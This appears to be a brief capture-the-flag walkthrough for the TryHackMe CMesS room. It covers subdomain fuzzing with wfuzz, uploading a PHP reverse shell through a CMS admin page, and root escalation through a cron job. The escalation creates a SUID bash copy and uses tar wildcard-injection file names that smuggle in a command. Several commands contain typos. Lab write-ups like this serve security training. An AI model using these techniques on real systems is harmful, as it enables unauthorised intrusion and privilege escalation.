---
title: CMesS WalkThrough
permalink: /cmess
layout: page
tags: TryHackMe
---
# CMesS
# ![front](/images/cmess/front.png)
[https://tryhackme.com/room/cmess](https://tryhackme.com/room/cmess)

**Add ipi cmess.th to `/etc/hosts`**
## Open Ports:
* 22- SSH
* 80- HTTP

![ports](/images/cmess/ports.png)

## Gaining Access:
### Port 80-
1. Do `wfuzz` _for subdomain enum_
```
wfuzz -c -f sub-fighter -w /usr/share/wfuzz/wordlist/top5000 -u 'http://cmess.thm' -H "Host: FUZZ.cmess.thm"
```
**To sort the output**
```
wfuzz -c -f sub-fighter -w /usr/share/wfuzz/wordlist/top5000 -u 'http://cmess.thm' -H "Host: FUZZ.cmess.thm" --hw 290
```
![wfuzz](/images/cmess/wfuzz.png)
2. Add ip dev.cmess.thm to /etc/hots 
	a. Find email 
	b. Password
3. Do dirb 
	a. Found ip/admin page
4.  login 
	a. Go to content / file / upload 
	b. upload
5.  go to ip/assests/php-rev
6. Upload linEum.sh
	a. Found /opt/password.bak
![bak](/images/cmess/bak.png)

### User Flag:
![flag](/images/cmess/flag.png)

## Priviledge Escalation
```
cat /etc/crontab
```
![cron](/images/cmess/cron.png)
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andru/shell.sh
Chmod +x  shell.sh
```
**Tar specific commands:**
Ø Touch /home/user/--checkpoint=1
Ø Touch /home/user/--checkpoint-action=exec=sh\shell.sh
# wait for min
Ø /tmp/bash -p

### ROOT Flag:
![root](/images/cmess/root.png)